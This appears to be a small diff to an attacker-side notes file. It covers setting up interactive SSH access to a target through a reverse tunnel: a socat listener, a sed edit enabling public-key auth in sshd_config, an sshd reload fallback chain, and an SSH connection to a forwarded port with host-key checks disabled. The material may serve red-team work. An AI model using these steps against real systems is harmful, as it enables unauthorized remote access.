@@ -9,7 +9,7 @@ socat -d -d TCP-LISTEN:<CHK_PORT>,fork,reuseaddr system:/path/to/info.sh
 #On Attack Host
 #When ready to have interactive shell
 sed -i "s/PubkeyAuthentication no #/PubkeyAuthentication yes #/" /etc/ssh/sshd_config
-systemctl restart ssh
+systemctl reload ssh 2>/dev/null || systemctl reload sshd 2>/dev/null || service ssh reload 2>/dev/null || service sshd reload 2>/dev/null || kill -HUP "$(pgrep -o -x sshd)"
 
 //Initial Connection
 ssh -M -S /tmp/<target> -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p <REMLIS> <user>@127.0.0.1
